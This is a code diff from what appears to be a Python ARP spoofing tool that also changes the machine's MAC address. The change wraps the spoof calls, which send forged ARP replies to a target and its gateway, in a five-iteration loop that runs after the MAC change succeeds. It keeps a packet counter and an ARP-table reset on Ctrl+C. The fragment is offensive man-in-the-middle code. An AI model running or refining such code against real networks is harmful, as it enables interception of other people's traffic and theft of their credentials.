@@ -91,16 +91,20 @@ try:
             current_mac = get_current_mac(options.interface)
             if current_mac == news_mac:
                 print("[+] MAC address was successfully changed to " + current_mac)
-                time.sleep(2)
+                time.sleep(3)
                 print("")
+                i = 0
+                while i < 5:
+                    spoof(target_ip, gateway_ip)
+                    spoof(gateway_ip, target_ip)
+                    sent_packets_count += 2
+                    print("\r[+] Packets sent: " + str(sent_packets_count), end="")
+                    sys.stdout.flush()
+                    # time.sleep(1)
+                    print("")
+                    i += 1
             else:
                 print("[-] MAC address did not get changed.")
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count += 2
-        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
-        sys.stdout.flush()
-        time.sleep(2)
 except KeyboardInterrupt:
     print("\n[-] Detected ctrl + C ... Resetting ARP tables ... Please wait.\n")
     restore(target_ip, gateway_ip)
